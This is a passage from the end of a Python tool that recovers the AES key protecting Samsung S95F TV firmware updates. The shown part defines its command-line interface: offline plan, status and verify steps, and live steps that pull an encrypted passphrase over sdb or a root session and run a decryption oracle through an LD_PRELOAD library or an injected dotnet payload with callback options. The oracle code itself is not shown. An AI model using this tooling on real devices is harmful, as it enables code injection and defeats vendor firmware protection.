        print(f"error: {error}", file=sys.stderr)
        return EXIT_ERROR
    _print_evidence(evidence)
    result = outcome.get("value", "incomplete")
    completed = _completed_block_count(state)
    if result == "complete":
        print(
            f"recovery=complete blocks={completed}/{CIPHERTEXT_BLOCKS} "
            f"queries={state.get('queries_total')} batches={state.get('batches_total')}"
        )
        print("next: uv run python tools/recover_s95f_aes.py verify "
              "--ciphertext <section> --iv-hex <32 hex> --expected-crc32 <hex>")
        return EXIT_OK
    print(
        f"recovery=incomplete blocks={completed}/{CIPHERTEXT_BLOCKS} "
        f"queries={state.get('queries_total')} batches={state.get('batches_total')}"
    )
    print("resume: uv run python tools/recover_s95f_aes.py recover --host <ip> --live")
    return EXIT_INCOMPLETE


def _print_evidence(evidence: dict[str, object]) -> None:
    print(
        "root_agent_authenticated "
        f"uid={evidence.get('uid')} euid={evidence.get('euid')} "
        f"runtime={evidence.get('runtime')} smack={evidence.get('smack')!r}"
    )
    print(
        "session_checks "
        f"system_files_unchanged={str(evidence.get('system_files_unchanged')).lower()} "
        f"staging_cleaned={str(evidence.get('staging_cleaned')).lower()}"
    )


# --------------------------------------------------------------------------- #
# Command-line interface.
# --------------------------------------------------------------------------- #


def _add_offline_paths(parser: argparse.ArgumentParser) -> None:
    parser.add_argument("--workdir", default=str(DEFAULT_WORKDIR))
    parser.add_argument("--blob", help="416-byte encrypted passphrase blob (private)")
    parser.add_argument("--salt", help="8-byte firmware section salt (private)")
    parser.add_argument("--checkpoint", help="mode-0600 recovery checkpoint")
    parser.add_argument("--manifest", help="mode-0600 run manifest")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="recover_s95f_aes.py",
        description=(
            "S95F SWU firmware AES key recovery.  plan/status/verify never "
            "contact the TV; fetch/recover require --host and --live."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "live subcommands:\n"
            "  fetch    pull the 416-byte encrypted passphrase (and optional salt)\n"
            "  recover  run the bounded command-0 oracle in one archive-root session\n\n"
            "exit status: 0 = done, 2 = resume needed, 1 = error\n"
        ),
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    plan = subparsers.add_parser(
        "plan", help="offline: validate inputs and record the manifest"
    )
    _add_offline_paths(plan)
    plan.add_argument("--host", help="TV address to record (not contacted)")
    plan.add_argument("--preload-directory", default=str(DEFAULT_PRELOAD_DIRECTORY))
    plan.add_argument("--max-batches", type=int, default=0, help="0 = unlimited")
    plan.add_argument("--max-queries", type=int, default=0, help="0 = unlimited")
    plan.add_argument("--deadline", type=float, default=1800.0)
    plan.add_argument("--batch-size", type=int, default=256)
    plan.set_defaults(handler=cmd_plan)

    status = subparsers.add_parser(
        "status", help="offline: report checkpoint progress"
    )
    _add_offline_paths(status)
    status.set_defaults(handler=cmd_status)

    verify = subparsers.add_parser(
        "verify", help="offline: AES-256-CBC round trip for the recovered key"
    )
    verify.add_argument("--ciphertext", required=True, help="captured section ciphertext")
    verify.add_argument(
        "--iv-hex",
        help="16-byte section IV as 32 hex digits (else derived from --salt)",
    )
    verify.add_argument("--key-hex", help="32-byte key as hex (else read the checkpoint)")
    verify.add_argument("--expected-crc32", help="expected CRC-32 of the plaintext")
    verify.add_argument("--expected-sha256", help="expected SHA-256 of the plaintext")
    verify.add_argument("--reference-plaintext", help="byte-exact plaintext reference")
    verify.add_argument("--workdir", default=str(DEFAULT_WORKDIR))
    verify.add_argument("--blob")
    verify.add_argument("--salt")
    verify.add_argument("--checkpoint")
    verify.add_argument("--manifest")
    verify.set_defaults(handler=cmd_verify)

    fetch = subparsers.add_parser(
        "fetch", help="live: pull the encrypted passphrase from the TV over sdb"
    )
    _add_offline_paths(fetch)
    fetch.add_argument("--host", help="TV IPv4 address (required with --live)")
    fetch.add_argument("--live", action="store_true", help="confirm one live TV session")
    fetch.add_argument("--remote-blob", default=str(DEFAULT_REMOTE_BLOB))
    fetch.add_argument("--remote-salt", help="optional remote 8-byte salt path")
    fetch.add_argument(
        "--transport",
        choices=("auto", "sdb", "session"),
        default="auto",
        help="auto falls back to a read-only root session when sdb refuses the path",
    )
    fetch.add_argument(
        "--recon",
        action="store_true",
        help="also list SWU directories and read the SWU application ABI",
    )
    fetch.add_argument("--session-timeout", type=float, default=180.0)
    fetch.add_argument("--callback-host")
    fetch.add_argument("--bind-host")
    fetch.add_argument("--accept-timeout", type=float, default=30.0)
    fetch.add_argument("--sdb", help="path to the sdb executable")
    fetch.add_argument("--bridge-token")
    fetch.add_argument("--bridge-port", type=int, default=SDB_BRIDGE_PORT)
    fetch.add_argument("--sdb-timeout", type=float, default=15.0)
    fetch.set_defaults(handler=cmd_fetch)

    recover = subparsers.add_parser(
        "recover", help="live: run the bounded oracle in one archive-root session"
    )
    _add_offline_paths(recover)
    recover.add_argument("--host", help="TV IPv4 address (required with --live)")
    recover.add_argument("--live", action="store_true", help="confirm one live TV session")
    recover.add_argument(
        "--evaluator",
        choices=EVALUATORS,
        default="preload",
        help="preload = LD_PRELOAD .so (needs UEP off); payload = managed dotnet",
    )
    recover.add_argument(
        "--oracle-payload-directory",
        default=str(DEFAULT_PAYLOAD_DIRECTORY),
        help="directory holding the built SamsungTvSwuOracle payload",
    )
    recover.add_argument("--preload-directory", default=str(DEFAULT_PRELOAD_DIRECTORY))
    recover.add_argument("--max-batches", type=int, default=0, help="0 = unlimited")
    recover.add_argument("--max-queries", type=int, default=0, help="0 = unlimited")
    recover.add_argument("--deadline", type=float, default=1800.0)
    recover.add_argument("--batch-size", type=int, default=256)
    recover.add_argument("--command-timeout", type=float, default=45.0)
    recover.add_argument("--first-block", type=int, default=CIPHERTEXT_BLOCKS - 1)
    recover.add_argument("--last-block", type=int, default=0)
    recover.add_argument("--force-preflight", action="store_true")
    recover.add_argument("--callback-host")
    recover.add_argument("--bind-host")
    recover.add_argument("--accept-timeout", type=float, default=30.0)
    recover.add_argument("--sdb", help="path to the sdb executable (sets $SDB)")
    recover.add_argument("--bridge-token")
    recover.add_argument("--bridge-port", type=int, default=SDB_BRIDGE_PORT)
    recover.add_argument("--sdb-timeout", type=float, default=15.0)
    recover.set_defaults(handler=cmd_recover)
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    try:
        batch_size = getattr(args, "batch_size", None)
        if batch_size is not None and not 1 <= batch_size <= 256:
            raise UsageError("--batch-size must be between 1 and 256")
        for name in ("max_batches", "max_queries"):
            value = getattr(args, name, None)
            if value is not None and value < 0:
                raise UsageError(f"--{name.replace('_', '-')} cannot be negative")
        return int(args.handler(args))
    except UsageError as error:
        print(f"error: {error}", file=sys.stderr)
        return EXIT_ERROR
    except (OracleError, SdbError, OSError, ValueError, json.JSONDecodeError) as error:
        print(f"error: {error}", file=sys.stderr)
        return EXIT_ERROR
    except KeyboardInterrupt:
        print("interrupted", file=sys.stderr)
        return EXIT_ERROR


if __name__ == "__main__":
    raise SystemExit(main())